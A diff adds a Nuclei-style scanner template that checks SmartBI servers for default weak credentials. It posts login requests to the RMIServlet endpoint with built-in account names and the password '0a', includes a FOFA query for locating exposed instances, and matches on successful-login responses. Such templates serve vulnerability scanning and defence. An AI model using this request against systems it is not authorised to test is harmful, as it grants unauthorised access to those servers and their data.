@@ -1,0 +1,58 @@
+id: smartbi-default-login
+
+info:
+  name: SmartBI - Default Login
+  author: SleepingBag945
+  severity: high
+  description: |
+    Smartbi Default User Weak Password were discovered.
+  reference:
+    - https://mp.weixin.qq.com/s?__biz=MzIwMDk1MjMyMg==&mid=2247491565&idx=1&sn=eb2af62a72167c6f82ae8ec3db878511
+    - https://github.com/zan8in/afrog/blob/main/v2/pocs/afrog-pocs/vulnerability/smartbi-default-user-weakpass.yaml
+    - https://github.com/Threekiii/Awesome-POC/blob/master/Web%E5%BA%94%E7%94%A8%E6%BC%8F%E6%B4%9E/Smartbi%20%E7%99%BB%E5%BD%95%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E.md
+  metadata:
+    verified: true
+    max-request: 2
+    fofa-query: app="SMARTBI"
+  tags: smartbi,default-login
+
+http:
+  - raw:
+      - |
+        POST {{path}} HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        className=UserService&methodName=loginFromDB&params=["{{role}}","0a"]
+
+    payloads:
+      path:
+        - /smartbi/vision/RMIServlet
+        - /vision/RMIServlet
+
+      role:
+        - system
+        - service
+        - public
+    attack: pitchfork
+    stop-at-first-match: true
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - '"result":true'
+          - '"retCode":0'
+        condition: and
+
+      - type: word
+        part: header
+        words:
+          - 'text/plain'
+
+      - type: status
+        status:
+          - 200
+
+# digest: 4a0a00473045022100d032c64f94dcbc247f6f0a57463eebfe9973b99e98f69ba3c96158e9912fab25022021c7596fa58474bdfa941abc830a100db6fbeb0e0c2978e105200aaa4a479d55:922c64590222798bb761d5b6d8e72950
